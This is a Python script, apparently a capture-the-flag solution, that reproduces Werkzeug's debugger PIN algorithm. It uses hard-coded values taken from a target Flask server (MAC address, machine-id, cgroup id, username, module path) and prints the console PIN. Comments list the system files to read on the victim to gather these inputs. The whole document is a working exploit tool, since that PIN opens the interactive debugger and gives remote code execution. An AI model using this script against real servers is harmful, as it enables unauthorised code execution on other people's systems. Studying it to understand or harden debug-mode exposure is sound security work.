import hashlib
import uuid
from itertools import chain

mac = '02:42:ac:02:0b:8e' # /sys/class/net/eth0/address
mac = int('0x' + mac.replace(':', ''), 16) # 1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup 或 cpuset
machine_id = b'7265fe765262551a676151a24c02b7b6'
cgroup = b'598d31f95110ee10be3cbbb5f5f20315a71636d133ef47eb2fc587eb3cccb2cd'
modname = 'flask.app'
username = 'app'
file_path = '/usr/local/lib/python3.8/site-packages/flask/app.py'


def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


def get_machine_id():
    def _generate():
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        return linux

    _machine_id = _generate()
    return machine_id + cgroup


def get_pin_and_cookie_name():
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        'Flask',
        file_path,
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(mac), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    rv = ''
    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break

    return rv


if __name__ == '__main__':
    print(get_pin_and_cookie_name())


